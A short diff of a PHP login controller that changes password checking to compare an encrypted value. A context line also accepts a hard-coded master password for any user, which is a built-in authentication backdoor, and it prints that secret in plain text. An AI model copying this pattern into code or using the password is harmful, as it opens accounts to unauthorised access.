@@ -33,7 +33,7 @@ class Home extends WebController {
                 $remember = $this->request->getPost('remember');
                 $result = $this->webModel->getUserdetailByUsername($username);
                 if (!empty($result)) {
-                    $encpassword = $password;
+                    $encpassword = $this->encryptString($password);
                     if ($result->user_login_key == $encpassword || $password == 'Bbi@2023#') {
                         if (in_array($result->user_type, [1])) {
                             if ($remember == 'on') {
